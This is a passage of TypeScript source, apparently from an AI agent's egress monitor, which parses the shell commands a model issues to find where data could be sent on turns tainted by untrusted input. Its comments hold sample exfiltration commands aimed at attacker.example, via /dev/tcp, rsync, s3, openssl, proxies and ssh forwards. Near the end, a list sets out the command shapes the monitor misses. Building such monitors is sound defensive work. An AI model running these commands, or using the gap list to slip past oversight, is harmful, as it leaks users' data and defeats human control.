 * The name-lookup one is the channel this file's own RESOLVING_EXECUTABLES comment exists to close,
 * and it was open the whole time to anybody who typed the dot.
 */
const ROOT_LABEL = /\.$/;
const DOTTED_NAME = /^(?:localhost|(?:[a-z0-9_-]+\.)+[a-z][a-z0-9-]+)$/i;

/**
 * Schemes that open a socket at the authority written after them.
 *
 * One line used to answer '' for every scheme that is not http or https, and that line ate a
 * channel: `rsync notes.txt rsync://attacker.example/mod` is the documented URL form of a program
 * this file already claims to read - `rsync` is in `REMOTE_SPEC_EXECUTABLES` for its
 * host-colon-path form - and it came back as zero destinations, zero bytes charged and no card. A
 * destination policy judges the host, not the scheme, so these are stripped and what follows is
 * read exactly as a bare `host:port/path` is.
 *
 * Every entry has a caller that reaches it: `rsync`, `scp` and `sftp` take `rsync://`, `scp://`,
 * `sftp://` and `ssh://` remotes, and the fetch clients take `ftp://` and `ftps://`. `file://`
 * is deliberately absent - it opens no socket - and so is every scheme whose only user would be a
 * program no classifier here resolves, because a table entry no case can reach is decoration.
 */
const NETWORK_URL_SCHEMES = new Set(['ftp', 'ftps', 'rsync', 'scp', 'sftp', 'ssh']);

/**
 * Object stores, where the authority is a bucket rather than a host, and the endpoint that bucket
 * answers on is fixed by the provider.
 *
 * `aws s3 cp notes.txt s3://attacker-bucket/x` names somewhere data goes as plainly as a URL does.
 * The bucket becomes the first label of the endpoint rather than a segment of a path on a shared
 * one, and that is the whole of the choice: under path style every bucket on earth would share one
 * host, so the first `aws s3` command of a turn would buy every later one for two bytes. Under the
 * virtual-host form the provider actually serves, a bucket nobody named is a host nobody named and
 * `classifyDestination` judges it as one.
 */
const BUCKET_URL_HOSTS: Record<string, string> = {
  gs: 'storage.googleapis.com',
  s3: 's3.amazonaws.com'
};

/** What both providers allow a bucket to be called, at its longest. */
const BUCKET_NAME = /^[a-z0-9][a-z0-9._-]{1,62}$/i;

/**
 * The request one command argument would make, as an address, or '' when it names none.
 *
 * An address in a shell command is not a URL: it is written without a scheme (`curl x.example/q`),
 * with a user in front of it (`ssh me@x.example`), with a port after it (`nc x.example 443`) or
 * with a remote path after a colon (`scp f me@x.example:/tmp`). All four put the name first, so the
 * name is taken from the front and whatever follows is kept as the path - the part the budget then
 * charges. The scheme is filled in as https because `classifyDestination` reads only http and https
 * and neither the charge nor the host judgement depends on which of the two it is.
 *
 * The userinfo is stripped from the authority rather than from the whole token, because `@` is a
 * legal character in a path and a bucket key is a path: taking everything after the last one read
 * `s3://bucket/inbox@2026` as a host called `2026`.
 */
const addressFromArgument = (raw: string): string => {
  const written = raw.replace(/^['"]+|['"]+$/g, '').trim();
  if (!written) return '';
  const scheme = /^([a-z][a-z0-9+.-]*):\/\//i.exec(written);
  let token = scheme ? written.slice(scheme[0].length) : written;
  if (scheme) {
    const name = (scheme[1] ?? '').toLowerCase();
    if (name === 'http' || name === 'https') return written;
    const endpoint = ownEntry(BUCKET_URL_HOSTS, name);
    if (endpoint) {
      const split = token.search(/[/?#]/);
      const bucket = (split < 0 ? token : token.slice(0, split)).toLowerCase();
      if (!BUCKET_NAME.test(bucket)) return '';
      token = `${bucket}.${endpoint}${split < 0 ? '' : token.slice(split)}`;
    } else if (!NETWORK_URL_SCHEMES.has(name)) return '';
  }
  const cut = token.search(/[/?#]/);
  const tail = cut < 0 ? '' : token.slice(cut);
  const withUser = cut < 0 ? token : token.slice(0, cut);
  const authority = withUser.slice(withUser.lastIndexOf('@') + 1);
  const six = ipv6Authority(authority);
  const [writtenHost = '', port = ''] = six ?? authority.split(':');
  // See ROOT_LABEL. The name is normalised before it is judged and before it is returned, so the
  // card, the suffix match and the budget all read the host the resolver will actually use.
  const host = !six && writtenHost.length > 1 ? writtenHost.replace(ROOT_LABEL, '') : writtenHost;
  if (!six && !(IPV4_LITERAL.test(host) || numericHost(host) || DOTTED_NAME.test(host))) return '';
  try {
    return new URL(`https://${host}${/^\d+$/.test(port) ? `:${port}` : ''}${tail || '/'}`).href;
  } catch {
    return '';
  }
};

/**
 * A table lookup keyed by something the model wrote, which cannot answer with `Object.prototype`.
 *
 * Six tables below are indexed by an executable or a subcommand taken straight out of the tool
 * call, and a plain object answers for every name on its prototype: `LOCAL_VALUE_OPTIONS['toString']`
 * is a function rather than undefined, so `optionValueAt`'s `table.has(...)` threw. Driven on the
 * shipped floor: `approvalRequirement('shell', { executable: 'toString', args: [...] },
 * 'autonomous')` raised a TypeError out of `commandAddresses`, through `callDestinations`, through
 * `ordinaryRequirement`, with nothing between the model and here to catch it. A floor that throws
 * is a floor that did not fire, and the string that does it is five characters.
 *
 * `Object.hasOwn` at the lookup rather than six tables rewritten as Maps, because the tables are
 * read once each and this is the smaller change to a file two lanes are editing at once.
 */
const ownEntry = <T>(table: Record<string, T>, name: string): T | undefined =>
  Object.hasOwn(table, name) ? table[name] : undefined;

/**
 * The option this argument is and the value it carries, when the option is one of `table`.
 *
 * `takesNext` is what separates `--header 'X: y'` from `--header=X: y`: the first eats the token
 * after it and the second does not, and reading them the same way either swallowed the address or
 * put the whole `--header=X: y` on the card as the option's name.
 */
const optionValueAt = (
  commandArgs: readonly string[],
  index: number,
  table: ReadonlySet<string> | undefined
): { option: string; value: string; takesNext: boolean } | null => {
  const argument = commandArgs[index] ?? '';
  if (!table) return null;
  const joined = argument.indexOf('=');
  if (argument.startsWith('--') && joined > 0) {
    const option = argument.slice(0, joined);
    return table.has(option.toLowerCase())
      ? { option, value: argument.slice(joined + 1), takesNext: false }
      : null;
  }
  const named = argument.startsWith('--') ? table.has(argument.toLowerCase()) : table.has(argument);
  // `-so page.html` is `-s` and `-o` written together, and only the last letter of a cluster takes
  // the value. Without this the filename came back as a host and carded an ordinary download.
  const clustered =
    !argument.startsWith('--') &&
    argument.startsWith('-') &&
    argument.length > 2 &&
    table.has(`-${argument.slice(-1)}`);
  if (!(named || clustered)) return null;
  return {
    option: clustered ? `-${argument.slice(-1)}` : argument,
    value: commandArgs[index + 1] ?? '',
    takesNext: true
  };
};

/**
 * Options that decide where the connection actually goes, whatever the address beside them says.
 *
 * `--resolve x.example:443:203.0.113.9` tells curl to skip the resolver and open the socket at that
 * third field, while every other argument, the card and the budget go on naming `x.example`. The
 * value was being read by `addressFromArgument`, which takes an authority as host and port and
 * destructures exactly two fields out of `split(':')`, so the address it stood for was
 * `https://x.example:443/` - the trusted host, already read this turn, no card and no charge - and
 * the bytes went to the third field. Worse than unreadable: unreadable now asks the owner, and this
 * answered confidently with the wrong host.
 *
 * `--connect-to h1:p1:h2:p2` is the same instruction in four fields. `-x/--proxy` is not here
 * because a proxy JOINS the address rather than replacing it - both ends receive the bytes - and it
 * has its own reader in `PROXY_OPTIONS`.
 *
 * When one of these is present the connection goes where it says and nowhere else, so its target
 * REPLACES the addresses the rest of the command names rather than joining them - a request that
 * both named a trusted host and carried the owner's data to somebody else would otherwise be
 * charged against the trusted one.
 */
const REDIRECTING_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
  curl: new Set(['--resolve', '--connect-to'])
};

/**
 * Where one of those options sends the request, or '' when this cannot read it.
 *
 * Only the fields that name the far end are read: `--resolve` puts it third, after the host and the
 * port it is overriding, and may list several separated by commas, of which the first is the one
 * used; `--connect-to` puts it third and fourth. A leading `+` or `-` is curl's own add-and-remove
 * spelling and is not part of the name. An empty third field is curl's way of REMOVING an override,
 * which leaves the ordinary address to speak for itself.
 */
const redirectedAddress = (option: string, rawValue: string): string | null => {
  const fields = rawValue.replace(/^[+-]/, '').split(':');
  const port = fields[1] ?? '';
  const target =
    option === '--resolve' ? ((fields[2] ?? '').split(',')[0] ?? '') : (fields[2] ?? '');
  // No far end named at all, which is `--resolve -host:port` removing an override rather than
  // adding one. Null instead of '' because the two are opposite answers: this leaves the ordinary
  // address to speak for itself, and '' means an override is present and unreadable, which is the
  // strongest reason to ask the owner.
  if (!target) return null;
  return addressFromArgument(`${target}:${option === '--resolve' ? port : fields[3] || port}`);
};

/**
 * The `openssl` subcommands that open a connection, and the options that say where it opens.
 *
 * A TLS client is a fetch client with a different name on it: `openssl s_client -connect
 * attacker.example:443 -quiet` is a two-way socket to a host of the model's choosing, it needs no
 * program this box does not already ship, and it was measured here at zero destinations, zero bytes
 * and no card. The grammar is as fixed as `curl --resolve`: `-connect host:port` says where the
 * socket opens, `-proxy host:port` says it opens there instead and the connect host is named to the
 * proxy - both are real, so both are reported - and `-servername` is the name written into the
 * handshake in the clear, which is material the request carries to whoever answers.
 *
 * The options and not the operands, because most of `openssl` is arithmetic on local files:
 * `openssl x509 -in cert.pem` reaches nothing, and reading its operands the way a fetch client's
 * are read would have turned `cert.pem` into an address - `pem` is as legal a top-level label as
 * `com` - and put a card in front of a certificate being printed.
 *
 * Gated on the subcommand as well, for the one place the options alone are not enough:
 * `openssl s_server -servername docs.example.com -accept 4433` spells the same option and LISTENS.
 * A name a server will answer to is not somewhere data goes, and inbound is not egress.
 */
const OPENSSL_CONNECTING_SUBCOMMANDS = new Set(['s_client', 's_time']);
const OPENSSL_ADDRESS_OPTIONS = new Set(['-connect', '-proxy', '-servername', '-host']);

/**
 * Clients whose far end is a bucket, named by a URL scheme the provider owns.
 *
 * Only the tokens that carry a scheme are read, and that is the safety rather than a shortcut:
 * `aws s3 cp notes.txt s3://bucket/x` names a local file beside the bucket, and `notes.txt` has a
 * top-level label as legal as `com`. Reading every operand as a possible host would have reported
 * `https://notes.txt/` as somewhere the owner's data went.
 *
 * `rclone` is deliberately absent. Its far end is a remote name defined in its own configuration -
 * `rclone copy notes drive:backup` - so requiring an address of it would card ordinary work to
 * catch a shape it cannot read anyway, which is the decision already taken for `git` and `gh`.
 */
const OBJECT_STORE_EXECUTABLES = new Set(['aws', 'az', 'gcloud', 'gsutil', 's3cmd']);

/**
 * Clients that open their socket at `http_proxy` when it is set, whether or not their own arguments
 * are read for an address.
 *
 * A different list from `FETCH_CLIENT_EXECUTABLES` because it answers a different question. That
 * list is the programs whose argument grammar names a far end, and `git`, `gh` and the package
 * managers are kept off it on purpose - their remote lives in configuration, and requiring an
 * address of them would card `git pull` and `pip install requests` on every tainted turn. But a
 * proxy is not their remote. `https_proxy=attacker.example:3128 pip download <token>` opens its
 * socket at the proxy and nowhere else, so the proxy is the destination whatever the index URL
 * says, and keying the proxy reader on the narrower list left it unread: the assignment was
 * stripped as environment and the command judged as though it reached nothing. In front of `git
 * push` the same variable produced the card a clean push produces, with the proxy invisible on it.
 *
 * Every entry honours the shared spelling of the variable through the HTTP library it ships with.
 * Priced honestly: all of them speak https, so what the proxy sees is the host it is asked to
 * connect to and the volume of traffic, not the request path - which is why the proxy host alone
 * is charged and the operands beside it are not.
 *
 * `docker` is deliberately absent: a pull is done by the daemon, which does not inherit the
 * command's environment. A program's OWN spelling of the variable - `PIP_PROXY`,
 * `npm_config_proxy`, `CARGO_HTTP_PROXY` - is not read either; that is a list per program that
 * drifts, and it is stated in the limits comment above `callDestinations`.
 */
const PROXY_HONOURING_EXECUTABLES = new Set([
  ...FETCH_CLIENT_EXECUTABLES,
  ...REMOTE_SPEC_EXECUTABLES,
  ...OBJECT_STORE_EXECUTABLES,
  'apt',
  'apt-get',
  'brew',
  'bundle',
  'bundler',
  'cargo',
  'composer',
  'gem',
  'gh',
  'git',
  'go',
  'npm',
  'npx',
  'pip',
  'pip3',
  'pipx',
  'pnpm',
  'poetry',
  'twine',
  'uv',
  'yarn'
]);

/**
 * Whether a program opens its socket at the proxy variable, by the name it is installed under.
 *
 * `pip3.12` is how a distribution installs pip beside the interpreter it belongs to, and it is the
 * same program as `pip`; a set of exact names saw a program it had never heard of and read the
 * proxy in front of it as environment for nothing. The versioned spelling is read for the two
 * families that are installed that way, and for no other name.
 */
const honoursProxy = (executable: string): boolean => {
  const name = executable.toLowerCase();
  return (
    PROXY_HONOURING_EXECUTABLES.has(name) ||
    /^pip3?(?:\.\d+)?$/.test(name) ||
    /^(?:cargo|gem|bundle|composer)\d+(?:\.\d+)*$/.test(name)
  );
};

/**
 * The option the proxy variable is rewritten as, and the spellings the clients themselves take.
 *
 * `--proxy` is what `proxyOptionsFrom` appends and what `curl`, `pip` and `npm` accept on the
 * command line; `--https-proxy` is npm's second spelling. Read for every client on the list above
 * and for no other, so a program with a `--proxy` that means something local is never asked.
 *
 * A proxy value may carry a SOCKS scheme - `socks5h://attacker.example:1080` - which says how to
 * talk to the proxy and nothing about where it is, so that scheme comes off before the host is
 * read; an http(s) one is left as written, so the literal-URL scan beside this reader sees the
 * same spelling and the host is charged once. A value this cannot read is returned as written,
 * because a socket that opens at `$P` opens somewhere nobody can see, and that is the strongest
 * case for asking rather than the weakest.
 */
const PROXY_OPTIONS = new Set(['--proxy', '--https-proxy']);
const proxyAddress = (value: string): string =>
  addressFromArgument(value.replace(/^socks[45][ah]?:\/\//i, '')) ||
  (/[$`]/.test(value) ? value : '');

/**
 * Where an `az storage` call puts its bytes.
 *
 * Azure writes its far end as a flag rather than as a URL, and the pair is still a fixed grammar:
 * the account name and the service word compose `<account>.<service>.core.windows.net`, which is
 * the endpoint the provider serves rather than a name invented here. Only the data-plane nouns are
 * mapped - `az storage account list` manages the account rather than writing to it - and a noun
 * this cannot place names no address at all rather than a guessed one.
 */
const AZURE_STORAGE_SERVICES: Record<string, string> = {
  blob: 'blob',
  container: 'blob',
  copy: 'blob',
  directory: 'file',
  file: 'file',
  fs: 'dfs',
  queue: 'queue',
  share: 'file',
  table: 'table'
};
const AZURE_ACCOUNT_OPTIONS = new Set(['--account-name']);

const azureStorageAddress = (commandArgs: readonly string[]): string => {
  const operands = commandArgs.filter((argument) => !argument.startsWith('-'));
  if ((operands[0] ?? '').toLowerCase() !== 'storage') return '';
  const service = ownEntry(AZURE_STORAGE_SERVICES, (operands[1] ?? '').toLowerCase()) ?? '';
  const account = commandArgs
    .map(
      (_argument, index) => optionValueAt(commandArgs, index, AZURE_ACCOUNT_OPTIONS)?.value ?? ''
    )
    .find(Boolean);
  // An account named at run time, or through `AZURE_STORAGE_CONNECTION_STRING`, is one this cannot
  // read - and it is not carded as unreadable, because `az storage` has a hundred subcommands that
  // name no account and interrupting all of them would be the card that gets the floor switched off.
  return service && account && /^[a-z0-9]{3,24}$/i.test(account)
    ? `https://${account.toLowerCase()}.${service}.core.windows.net/`
    : '';
};

/**
 * Socat writes its far end as `TYPE:host:port`, so the host is the second field rather than the
 * first.
 *
 * `socat` has been in `CONNECTING_EXECUTABLES` all along and the entry could not fire: the reader
 * takes an authority as host and port, so `TCP:attacker.example:443` was a host called `TCP` and
 * failed the name test. The type prefix is enumerated rather than matched loosely, because
 * `EXEC:`, `FILE:` and `OPEN:` are the same grammar naming something local.
 *
 * `socks5` is here beside `socks4`, which was written without it. Both spellings put the proxy
 * socat actually dials in the first field after the type, so the host this reads is the host the
 * socket opens at, exactly as for `proxy` - and `socat - SOCKS5:attacker.example:1.2.3.4:80` was
 * measured at 0 destinations with `socks4` alone in the list.
 */
const SOCAT_CONNECTING_TYPE =
  /^(?:tcp|udp|sctp|dtls|ssl|openssl|socks4a?|socks5|proxy)[46]?(?:-connect)?:/i;
const socatTarget = (argument: string): string =>
  SOCAT_CONNECTING_TYPE.test(argument) ? argument.slice(argument.indexOf(':') + 1) : argument;

/**
 * Options whose value is a local file that CONTAINS the addresses.
 *
 * `curl -K leak.conf` and `wget -i urls.txt` write their far end down one level of indirection
 * away, in a file this reader cannot open. The address is unreadable rather than absent, and
 * unreadable is the case the fallback below exists for: without this, tightening that fallback so
 * `curl --version` stops carding would also have stopped `curl -K` carding, and the second one
 * really does reach somewhere.
 */
const ADDRESS_FILE_OPTIONS: Record<string, ReadonlySet<string>> = {
  curl: new Set(['-K', '--config']),
  wget: new Set(['-i', '--input-file'])
};

/**
 * Where an ssh forward sends what goes into it.
 *
 * `ssh -L 8080:attacker.example:80 bastion.example` is the `--resolve` shape wearing ssh's clothes:
 * every argument on the card names the bastion, the bastion is a host the owner named, and the
 * bytes a later `curl localhost:8080/?q=<the mailbox>` puts into the tunnel come out at
 * `attacker.example`. That second command is loopback and free, so without this the whole sequence
 * is charged for the one hop the owner would have approved anyway.
 *
 * Both hops are real - unlike `--resolve`, the bastion does receive the bytes - so the forward
 * target JOINS the connection host rather than replacing it. The grammar is ssh's own:
 * `[bind:]port:host:hostport` for `-L` and `-R`, `host:port` for `-W`, so the host is the second
 * field of three, the third of four, and the first of two. `-D` opens a SOCKS proxy and names no
 * host at all, which is why it is not here.
 */
const SSH_FORWARD_OPTIONS = new Set(['-L', '-R', '-W']);
const forwardedHost = (value: string): string => {
  const fields = value.split(':');
  return (fields.length === 2 ? fields[0] : fields.length === 3 ? fields[1] : fields[2]) ?? '';
};

/**
 * Every address one resolved command would reach, and the material it would carry there.
 *
 * The addresses and the carried material come back as one list of URLs because that is what the
 * budget measures and what the card names: `classifyDestination` charges a request by its host and
 * by the pieces of it the model composed, and a header value is a piece the model composed. The
 * address is left byte-identical when the command carries nothing extra, which is what keeps the
 * whole-address credit in `egress.ts` working for a link the harness handed over.
 */
const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]): string[] => {
  const name = executable.toLowerCase();
  const local = ownEntry(LOCAL_VALUE_OPTIONS, name);
  const carriedTable = ownEntry(CARRIED_VALUE_OPTIONS, name);
  const redirectingTable = ownEntry(REDIRECTING_VALUE_OPTIONS, name);
  // Only where the subcommand is one that connects. See OPENSSL_CONNECTING_SUBCOMMANDS.
  const addressTable =
    name === 'openssl' &&
    OPENSSL_CONNECTING_SUBCOMMANDS.has(
      (commandArgs.find((argument) => !argument.startsWith('-')) ?? '').toLowerCase()
    )
      ? OPENSSL_ADDRESS_OPTIONS
      : undefined;
  const skip = new Set<number>();
  const carried: Array<[string, string]> = [];
  const redirects: string[] = [];
  const named: string[] = [];
  const forwards: string[] = [];
  const proxies: string[] = [];
  let addressFile = false;
  let redirected = false;
  commandArgs.forEach((_argument, index) => {
    const localOption = optionValueAt(commandArgs, index, local);
    if (localOption?.takesNext) skip.add(index + 1);
    const proxyOption = honoursProxy(name)
      ? optionValueAt(commandArgs, index, PROXY_OPTIONS)
      : null;
    if (proxyOption) {
      if (proxyOption.takesNext) skip.add(index + 1);
      proxies.push(proxyOption.value);
    }
    if (optionValueAt(commandArgs, index, ownEntry(ADDRESS_FILE_OPTIONS, name))) addressFile = true;
    const forwardOption =
      name === 'ssh' ? optionValueAt(commandArgs, index, SSH_FORWARD_OPTIONS) : null;
    if (forwardOption) {
      if (forwardOption.takesNext) skip.add(index + 1);
      forwards.push(forwardedHost(forwardOption.value));
    }
    const addressOption = optionValueAt(commandArgs, index, addressTable);
    if (addressOption) {
      if (addressOption.takesNext) skip.add(index + 1);
      if (addressOption.value) named.push(addressOption.value);
    }
    const redirectingOption = optionValueAt(commandArgs, index, redirectingTable);
    if (redirectingOption) {
      if (redirectingOption.takesNext) skip.add(index + 1);
      const target = redirectingOption.value
        ? redirectedAddress(redirectingOption.option.toLowerCase(), redirectingOption.value)
        : null;
      if (target !== null) {
        redirected = true;
        if (target) redirects.push(target);
      }
    }
    const carriedOption = optionValueAt(commandArgs, index, carriedTable);
    if (!carriedOption) return;
    if (carriedOption.takesNext) skip.add(index + 1);
    if (carriedOption.value) carried.push([carriedOption.option, carriedOption.value]);
  });
  const candidates = commandArgs
    .map((argument, index) => (skip.has(index) || /^[-+]/.test(argument) ? '' : argument))
    .filter(Boolean);
  const resolve = (tokens: readonly string[]): string[] =>
    tokens.map(addressFromArgument).filter(Boolean);
  let addresses: string[] = [];
  // `dig @1.1.1.1 <name>` asks a resolver of the model's choosing, and that resolver is where the
  // name goes; `addressFromArgument` takes the host from after the last `@` for exactly this and
  // for `ssh me@host`, so the server needs no branch of its own.
  if (addressTable) addresses = resolve(named);
  else if (FETCH_CLIENT_EXECUTABLES.has(name) || RESOLVING_EXECUTABLES.has(name))
    addresses = resolve(candidates);
  // An override speaks for the whole command: it is where the socket opens, so the host the rest of
  // the arguments name never receives anything. An override this cannot read leaves no addresses at
  // all, which drops through to the unreadable-address card below rather than back to that host.
  if (redirected) addresses = redirects;
  else if (CONNECTING_EXECUTABLES.has(name))
    // The connection host, and then wherever a forward would carry what goes into it. Both, because
    // both receive the bytes - see SSH_FORWARD_OPTIONS.
    addresses = [...resolve(candidates.map(socatTarget)).slice(0, 1), ...resolve(forwards)];
  else if (REMOTE_SPEC_EXECUTABLES.has(name))
    addresses = resolve(candidates.filter((argument) => /[:@]/.test(argument)));
  else if (OBJECT_STORE_EXECUTABLES.has(name))
    addresses = [
      ...resolve(candidates.filter((argument) => /^[a-z][a-z0-9+.-]*:\/\//i.test(argument))),
      ...[azureStorageAddress(commandArgs)].filter(Boolean)
    ];
  /*
   * The tokens this command wrote down as its far end, which is a different question from whether
   * any of them could be read.
   *
   * A client that always names one and named nothing readable is the unreadable-address case, and
   * asking about it is the whole point of the fallback below - an operand this could not read, or a
   * file it was told the addresses are listed in. A client that named none at all is not: `curl
   * --version` and `curl --help` contact nothing, and both raised "Allow this command to unparseable
   * address", charging four bytes for the word `curl` - a card naming a destination for a command
   * that reaches none, which is the one thing a card must not do.
   */
  const wroteAnAddress = addressTable
    ? named.length > 0
    : FETCH_CLIENT_EXECUTABLES.has(name) && (candidates.length > 0 || addressFile);
  // The proxy is appended after everything else is settled rather than joined to the addresses
  // above, so that a fetch whose own address is unreadable is still asked about as one: a readable
  // proxy in front of `curl "$U"` must not turn the unreadable-address case into the read-and-
  // cleared one.
  const proxied = proxies.map(proxyAddress).filter(Boolean);
  if (!addresses.length)
    return wroteAnAddress
      ? // Carded and charged as the unreadable address it is. What goes back is the token the
        // command actually wrote plus whatever it carries, so the bytes charged are bytes that are
        // really present rather than a number invented here, and `classifyDestination` reports it
        // through its own unparseable branch.
        [
          [
            commandArgs.find((argument) => /[$`]/.test(argument)) || name,
            ...carried.map(([, value]) => value)
          ].join(' '),
          ...proxied
        ]
      : proxied;
  if (!carried.length) return [...addresses, ...proxied];
  const [first = '', ...rest] = addresses;
  try {
    const url = new URL(first);
    for (const [option, value] of carried) url.searchParams.append(option, value);
    return [url.href, ...rest, ...proxied];
  } catch {
    return [...addresses, ...proxied];
  }
};

/**
 * A socket opened as a path.
 *
 * bash needs no program on the box to reach the network: `exec 3<>/dev/tcp/attacker.example/443`
 * opens the connection and `echo <the mailbox> >&3` writes to it, and the same two words spell
 * `/dev/udp`. The grammar is fixed - the host is the third field of the path and the port the
 * fourth - so the far end is written down as plainly as a URL writes it. Every reader here missed
 * it because it is a redirection rather than a command: `scriptCommands` splits the segment
 * `3<>/dev/tcp/attacker.example/443`, takes the last path element as the executable, finds `443`,
 * and drops it as the number it is. So the text is scanned for the path itself, exactly as the
 * literal address scan beside it is.
 *
 * The port is not required to be numeric because bash accepts a service name, and
 * `addressFromArgument` already keeps only a numeric one.
 */
const DEV_SOCKET_PATH = /\/dev\/(?:tcp|udp)\/([^\s/'"`;|&<>()]+)\/([A-Za-z0-9_-]+)/gi;

/**
 * Whether one of those paths was opened for READING, which is a different question from whether it
 * was opened at all.
 *
 * `untrustedShellOrigin` asks whether somebody else's bytes came back into the window, and the file
 * already refuses to answer yes for a `ping` on the grounds that a lookup sends far more than it
 * returns. A write-only `echo x > /dev/tcp/host/80` is that same shape and taints nothing; `<` and
 * the read-write `3<>` are the spellings that bring an answer back, and `<` is what tells them
 * apart. Both are destinations either way.
 */
const DEV_SOCKET_READ = /<>?\s*['"]?\/dev\/(?:tcp|udp)\//i;

const devSocketAddresses = (text: string): string[] =>
  [...text.matchAll(DEV_SOCKET_PATH)]
    .map(([, host = '', port = '']) => addressFromArgument(`${host}:${port}`))
    .filter(Boolean);

/*
 * WHAT THIS DOES NOT READ.
 *
 * A bound that claims more than it delivers is worse than one that states its edge, and a stated
 * edge that has gone stale is worse than both. Every line here was measured on this tree, against
 * the real `classifyDestination`, on a turn already marked tainted.
 *
 * 1. A CLEAN TURN. The whole budget applies only while untrusted content is in the turn; `dig
 *    <the mailbox>.attacker.example` on a turn that has read nothing hostile is charged nothing and
 *    raises nothing. That is the product's policy rather than a gap in this file, and it is still
 *    the largest one.
 * 2. A PROGRAM THIS HAS NO TABLE FOR. `python3 -c 'socket.create_connection((h, 443))'`,
 *    `node -e 'fetch(u)'`, `docker push registry.example/img`, `smbclient //host/share`,
 *    `ldapsearch -H ldap://host`, `sendmail somebody@example.com < notes.txt` and `mail -s x
 *    somebody@example.com` all come back as 0 destinations. `effectiveCommands` finds the command;
 *    it is not one of the clients whose argument grammar is written down here, so its far end is
 *    read only if an http(s) address is spelled out in the invocation, by the literal scan. This is
 *    the open class, and every program added to it shrinks it by one.
 * 3. AN ADDRESS COMPOSED AT RUN TIME. `curl -s "$U"` and `openssl s_client -connect "$H:443"` are
 *    unreadable to any static reader, and they raise the unreadable-address card rather than
 *    passing quietly - but the host itself is never known, and `git clone "$U"`, `gh api "$P"`,
 *    `dig "$H.attacker.example"` and `rclone copy notes drive:backup` are not carded at all,
 *    because their far end lives in configuration and requiring one would card the ordinary work of
 *    this product. `/dev/tcp/$H/443` is unreadable in exactly the same way.
 * 4. A PAYLOAD THAT IS A FILE. `curl -d @secrets.json`, `openssl s_client … < secrets.json` and
 *    `aws s3 cp secrets.json s3://known-bucket/x` are charged for the address and the token, not for
 *    the file: its bytes are not readable here. The first is still carded by
 *    `sendsDataOverNetwork`; the charge understates all three by as much as the file is large.
 * 5. ADDRESSES IN A FILE. `curl -K leak.conf`, `wget -i urls.txt` and `xargs curl < urls.txt` all
 *    raise the unreadable-address card, and none of them is charged for what is in the file: the
 *    first two are charged 4 bytes for the client's own name, and the third reports
 *    `https://urls.txt/`, because `urls.txt` has as legal a top-level label as any host. That last
 *    one errs towards the card and names a host that does not exist while doing it.
 * 6. AN AZURE ACCOUNT THAT IS NOT ON THE COMMAND LINE. `az storage blob upload` reads
 *    `AZURE_STORAGE_ACCOUNT` and `AZURE_STORAGE_CONNECTION_STRING` from the environment when
 *    `--account-name` is absent, and an environment is not an argument. Not carded as unreadable
 *    either, for the reason in `azureStorageAddress`.
 * 7. A HOST WITH NO DOT IN IT OTHER THAN `localhost`. `curl myserver:8080/x` on a LAN name is not
 *    read as an address; for a fetch client it is the unreadable-address card instead, and for
 *    everything else it is nothing at all.
 * 11. A PORT OR A COUNT, deliberately, which is what is left of this entry. A name spelled as a
 *    number is closed: `numericHost` reads the 32-bit integer and hexadecimal forms `getaddrinfo`
 *    accepts, and `ipv6Authority` reads a literal bracketed or bare, before the split on `:` that
 *    an IPv6 address is made of. What is refused is any integer below 0x1000000, because reading
 *    every bare number carded `nc -l 8080` as 0.0.31.144 and `curl --retry 5` as 0.0.0.5 - and
 *    an address that small is in 0.0.0.0/8, which cannot be a destination, so nothing is lost.
 * 12. A PROXY IN CONFIGURATION rather than in the command or its environment.
 *    `git config http.proxy attacker.example:3128 && git push` is 0 destinations, because the far
 *    end is in a file this never reads and `git` is deliberately unread anyway - see the note on
 *    the fetch clients for why requiring an address of it would card `git pull` on every tainted
 *    turn. `git -c http.proxy=attacker.example:3128 push` is the same file written one step
 *    earlier and is 0 destinations for the same reason, and so is git's environment spelling of
 *    its configuration, `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=http.proxy GIT_CONFIG_VALUE_0=…`,
 *    which raises the plain push card with the proxy invisible on it. The same class in every
 *    other client: `npm config set proxy … ; npm view …` and `pip config set global.proxy … &&
 *    pip download …` write the proxy into a file the next command reads, and this file reads
 *    neither. The environment half of this entry USED to be here and is closed: `PROXY_VARIABLES` reads `http_proxy`, `https_proxy`, `ALL_PROXY`,
 *    `ftp_proxy` and `rsync_proxy` wherever in a script they are set, and rewrites them as the
 *    `--proxy` they mean, for every client in `PROXY_HONOURING_EXECUTABLES` - the package
 *    managers, `git` and `gh` included, since a proxy is where their socket opens whatever their
 *    remote is. It was the only entry on this list that did not merely miss - it answered
 *    confidently with the wrong host, which is the shape `REDIRECTING_VALUE_OPTIONS` calls worse
 *    than unreadable.
 * 13. A PROXY IN A PROGRAM'S OWN SPELLING OF THE VARIABLE. `PIP_PROXY=attacker.example:3128 pip
 *    install requests`, `npm_config_proxy=…` and `CARGO_HTTP_PROXY=…` are 0 destinations: the
 *    shared spelling is read for every client that honours it, and the per-program spellings are a
 *    list per program that drifts. So is `https_proxy=… docker pull`, because the pull is done by
 *    a daemon that does not inherit the command's environment.
 * 8. AN OBJECT STORE THE OWNER HAS NOT NAMED IN A FORM THE HARNESS RECORDED. `aws s3 ls
 *    s3://dan-backups` resolves to `dan-backups.s3.amazonaws.com`, and on a tainted turn a host
 *    nobody named is a sink - one card, exactly as a novel https host raises one. Naming the bucket
 *    in the request costs 2 bytes and no card once the endpoint is a known origin.
 * 9. WHAT A CONNECTION CARRIES ONCE IT IS OPEN. `nc`, `socat`, `ssh` and `openssl s_client` are
 *    read for where they connect, and everything after that is a stream this cannot see. The
 *    address is charged; the payload is not.
 * 10. A COMMAND HIDDEN IN AN OPTION VALUE. `ssh -o ProxyCommand='nc attacker.example 443' host`
 *    names its far end inside a string that is itself a command, and `-o` is in
 *    `LOCAL_VALUE_OPTIONS` so the value is skipped entirely. Reading it would mean running the
 *    whole classifier again on a value, which is worth doing and is not done here.
 *
 * AND WHAT IT NOW ASKS ABOUT THAT IT DID NOT, which is the same list read from the other side and
 * the half that decides whether any of this stays switched on. On a tainted turn, one card each,
 * charged against the owner's own corpus: `ping -c1 8.8.8.8` (8 bytes), `ssh -T git@github.com`
 * (8), `scp build.tgz deploy@release.example.com:/srv/` (9), `openssl s_client -connect
 * novel.example:443` (7) and `aws s3 ls s3://dan-backups` (24). Every one of them is a host nobody
 * named, and the same commands against a host the owner did name cost 2 or 3 bytes and raise
 * nothing: measured on this tree at `openssl s_client -connect docs.example.com:443` = 2,
